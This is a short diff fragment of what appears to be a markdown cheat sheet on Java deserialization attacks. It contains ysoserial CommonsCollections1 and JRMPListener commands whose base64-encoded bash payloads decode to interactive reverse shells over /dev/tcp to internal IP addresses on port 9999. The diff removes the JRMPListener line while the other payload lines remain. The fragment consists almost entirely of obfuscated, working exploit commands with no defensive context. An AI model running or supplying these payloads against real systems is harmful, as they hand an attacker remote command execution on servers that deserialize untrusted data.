@@ -83,7 +83,3 @@ bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85OTk5IDA+JjE=}|{base64,-d}|
 java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections1 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}'
 ```
 ###
-
-
-
-java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjAuNi85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}'
